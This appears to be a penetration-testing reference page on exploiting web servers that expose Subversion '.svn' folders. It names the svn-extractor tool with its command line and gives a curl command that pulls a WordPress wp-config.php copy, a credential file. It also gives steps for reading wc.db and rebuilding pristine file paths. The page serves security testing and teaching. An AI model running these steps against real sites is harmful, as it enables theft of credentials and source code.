# subversion

> subversion  (often abbreviated as svn) is a centralized version control system (vcs) that has been widely used in the software development industry. originally developed by collabnet inc. in 2000, subversion was designed to be an improved version of cvs (concurrent versions system) and has since gained significant traction for its robustness and reliability. 

## summary

* [tools](#tools)
* [methodology](#methodology)
* [references](#references)

## tools

* [anantshri/svn-extractor](https://github.com/anantshri/svn-extractor) - simple script to extract all web resources by means of .svn folder exposed over network. 
    ```powershell
    python svn-extractor.py --url "url with .svn available"
    ```

## methodology

```powershell
curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
```

1. download the svn database from http://server/path_to_vulnerable_site/.svn/wc.db
    ```powershell
    insert into "nodes" values(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',null,null,'file',x'2829',null,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',null,2,1456056344886288,'bl4de',38,1456056261000000,null,null);
    ```
    
2. download interesting files
    * remove `$sha1$` prefix
    * add `.svn-base` postfix
    * use first byte from hash as a subdirectory of the `pristine/` directory (`94` in this case)
    * create complete path, which will be: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`

## references

- [svn extractor for web pentesters - anant shrivastava - march 26, 2013](http://blog.anantshri.info/svn-extractor-for-web-pentesters/)